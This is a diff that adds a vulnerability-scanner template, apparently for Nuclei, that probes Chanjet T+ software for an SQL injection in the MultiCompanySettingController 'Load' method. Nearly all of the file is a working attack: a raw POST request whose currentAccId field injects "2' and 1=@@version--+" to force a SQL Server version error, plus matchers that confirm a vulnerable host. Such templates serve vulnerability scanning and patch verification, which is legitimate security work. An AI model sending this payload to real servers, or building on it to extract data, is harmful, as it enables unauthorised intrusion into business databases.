@@ -1,0 +1,31 @@
+id: changjietong-Load-sqli
+
+info:
+  name: 畅捷通T+ Load 存在SQL注入漏洞
+  author: changjietong
+  severity: high
+  tags: changjietong
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanySettingController,Ufida.T.SM.UIP.ashx?method=Load HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept-Encoding: gzip, deflate
+
+        {"currentAccId":"2' and 1=@@version--+", "currentAcc":"1", "currentDsName":"1", "currentVersion":"1", "currentVersionNo":"1"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "nvarchar"
+          - "Microsoft SQL Server"
+          - "数据库错误"
+        condition: and
+      - type: status
+        status:
+          - 200
